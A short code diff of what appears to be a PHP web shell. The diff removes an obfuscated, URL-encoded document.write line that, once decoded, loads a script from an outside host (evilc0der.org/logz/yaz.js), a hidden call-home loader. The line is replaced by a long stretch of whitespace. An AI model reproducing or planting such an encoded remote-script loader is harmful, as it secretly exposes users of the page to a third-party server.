@@ -895,9 +895,7 @@ echo "<textarea rows=17 cols=85>$safemodgec</textarea>";
 ?>
 <Script Language='Javascript'>
 <!-- HTML Encryption provided by iWEBTOOL.com -->
-<!--
-document.write(unescape('%3C%68%74%6D%6C%3E%3C%62%6F%64%79%3E%3C%53%43%52%49%50%54%20%53%52%43%3D%68%74%74%70%3A%2F%2F%77%77%77%2E%65%76%69%6C%63%30%64%65%72%2E%6F%72%67%2F%6C%6F%67%7A%2F%79%61%7A%2E%6A%73%3E%3C%2F%53%43%52%49%50%54%3E%3C%2F%62%6F%64%79%3E%3C%2F%68%74%6D%6C%3E'));
-//-->
+                                                                                                                                                                                                                                                                                                 //-->
 </Script>
 </center>
     <br>
